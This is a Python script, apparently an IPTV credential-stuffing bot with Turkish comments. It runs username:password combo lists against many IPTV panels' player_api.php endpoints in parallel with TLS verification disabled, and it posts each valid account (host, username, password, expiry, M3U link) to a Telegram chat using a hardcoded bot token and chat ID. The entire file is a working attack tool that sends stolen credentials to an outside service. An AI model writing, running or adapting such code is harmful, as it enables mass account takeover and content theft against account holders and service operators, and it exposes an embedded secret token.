import os
import time
import datetime
import gc
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"

TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        res = requests.post(url, data=data, timeout=10)
        if res.status_code != 200:
            print(f"[!] Telegram hata: {res.status_code}")
    except:
        pass

HEADERd = {
    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
    'Accept': '*/*',
    'Connection': 'close',  # Soketlerin TIME_WAIT'te yığılmasını önlemek için bağlantıyı hemen kapatıyoruz
    'Accept-Encoding': 'gzip',
    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def m3u_tara_detayli(session, panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    try:
        res = session.get(api_url, headers=HEADERd, timeout=(2, 3), verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            veri = str(res.text)
            if '"auth":1' in veri or '"status":"Active"' in veri:
                print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
                
                try: status = veri.split('status":')[1].split(',')[0].replace('"', '')
                except: status = "Active"
                
                try: acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
                except: acon = "?"
                
                try: mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
                except: mcon = "?"
                
                try:
                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
                    if bitis == 'null' or not bitis.isdigit(): bitis = 'Sınırsız'
                    else: bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
                except: bitis = 'Bilinmiyor'

                try:
                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
                except: realm, port = panel, "80"

                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                try:
                    k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
                    kanalsayisi = str(k_res.text.count('stream_id'))
                    v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
                    filmsayisi = str(v_res.text.count('stream_id'))
                    s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
                    dizisayisi = str(s_res.text.count('series_id'))
                except: pass

                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                mesaj = (
                    f"🟢 <b>IPTV HİT BULUNDU!</b>\n"
                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
                    f"📊 <b>Durum:</b> {status}\n"
                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Windows Soket Korumalı Yerel Tarayıcı Başlatıldı...")
    time.sleep(2)
    telegrama_gonder("🚀 <b>Lokal Tarayıcı Aktif (Port Koruma Modu)!</b>")
    
    combo_dir = os.path.join(BASE_DIR, 'combo')
    panel_dir = os.path.join(BASE_DIR, 'panel_list')
    
    while True:
        try:
            paneller = []
            if os.path.exists(panel_dir):
                for p_dosya in os.listdir(panel_dir):
                    if p_dosya.endswith('.txt'):
                        with open(os.path.join(panel_dir, p_dosya), 'r', encoding='utf-8', errors='ignore') as pf:
                            for line in pf:
                                p_clean = line.strip().replace('http://', '').rstrip('/')
                                if p_clean: paneller.append(p_clean)
            if not paneller: paneller = ["ornekpanel.com:8080"]

            if os.path.exists(combo_dir):
                for dosya_adi in os.listdir(combo_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
                        print(f"\n[i] Taranıyor: {dosya_adi}")
                        
                        batch_size = 300  # Paket boyutunu küçülttük ki Windows portları rahat nefes alsın
                        chunk = []
                        
                        with requests.Session() as session:
                            # Havuz limitlerini Windows'a göre optimize ettik
                            adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=0)
                            session.mount('http://', adapter)
                            session.mount('https://', adapter)
                            
                            with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                                for line in f:
                                    line = line.strip()
                                    if ':' in line:
                                        parts = line.split(':', 1)
                                        u, p = parts[0].strip(), parts[1].strip()
                                        if u and p:
                                            chunk.append((u, p))
                                    
                                    if len(chunk) >= batch_size:
                                        with ThreadPoolExecutor(max_workers=10) as executor: # İş parçacığını 10'a sabitledik (Windows stabil çalışması için)
                                            futures = [
                                                executor.submit(m3u_tara_detayli, session, panel, user, pas)
                                                for user, pas in chunk
                                                for panel in paneller
                                            ]
                                            for _ in as_completed(futures):
                                                pass
                                        chunk.clear()
                                        gc.collect()
                                        time.sleep(0.2) # Windows soketlerinin kapanması için minik bir mola

                                if chunk:
                                    with ThreadPoolExecutor(max_workers=10) as executor:
                                        futures = [
                                            executor.submit(m3u_tara_detayli, session, panel, user, pas)
                                            for user, pas in chunk
                                            for panel in paneller
                                        ]
                                        for _ in as_completed(futures):
                                            pass
                                    chunk.clear()
                                    gc.collect()

            print("\n[i] Tur tamamlandı, 10 dakika bekleniyor...")
            gc.collect()
            time.sleep(600)
        except Exception as e:
            print(f"[!] Döngü hatası: {e}")
            time.sleep(30)

if __name__ == '__main__':
    import threading
    t1 = threading.Thread(target=arka_plan_tarayici)
    t1.daemon = True
    t1.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
